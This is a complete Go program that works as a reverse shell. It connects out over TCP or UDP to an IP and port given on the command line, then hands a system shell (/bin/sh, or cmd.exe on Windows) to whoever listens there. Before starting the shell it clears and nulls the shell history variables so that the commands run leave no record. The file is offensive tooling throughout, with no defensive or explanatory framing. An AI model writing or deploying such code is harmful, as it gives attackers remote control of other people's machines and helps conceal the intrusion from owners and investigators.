package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"path"
	"runtime"
	"syscall"
	"time"
)

var (
	ip    string
	port  string
	addr  string
	conn  net.Conn
	shell = "/bin/sh"
	way   = "tcp"
)

func main() {

	if runtime.GOOS == "windows" {
		shell = "c:\\windows\\system32\\cmd.exe"
	}

	if len(os.Args) < 3 {
		fmt.Printf("Usage: %s [ip] [port] [udp]\n", path.Base(os.Args[0]))
		os.Exit(0)
	}

	if len(os.Args) == 4 {
		way = os.Args[3]
	}

	ip = os.Args[1]
	port = os.Args[2]
	addr = fmt.Sprintf("%s:%s", ip, port)

	if way == "tcp" {
		conn = tcp(addr)
	} else {
		conn = udp(addr)
		conn.Write([]byte("\n"))
	}

	cmd := exec.Command(shell)
	syscall.Unsetenv("HISTFILE")
	syscall.Unsetenv("HISTFILESIZE")
	syscall.Unsetenv("HISTSIZE")
	syscall.Unsetenv("HISTORY")
	syscall.Unsetenv("HISTSAVE")
	syscall.Unsetenv("HISTZONE")
	syscall.Unsetenv("HISTLOG")
	syscall.Unsetenv("HISTCMD")
	syscall.Setenv("HISTFILE", "/dev/null")
	syscall.Setenv("HISTSIZE", "0")
	syscall.Setenv("HISTFILESIZE", "0")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
	conn.Close()

}

func udp(addr string) *net.UDPConn {
	udpAddr, err := net.ResolveUDPAddr("udp4", addr)
	checkError(err)
	conn, err := net.DialUDP("udp", nil, udpAddr)
	return conn
}

func tcp(addr string) net.Conn {
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	checkError(err)
	return conn
}

func checkError(err error) {
	if err != nil {
		fmt.Println(err.Error())
	}
}
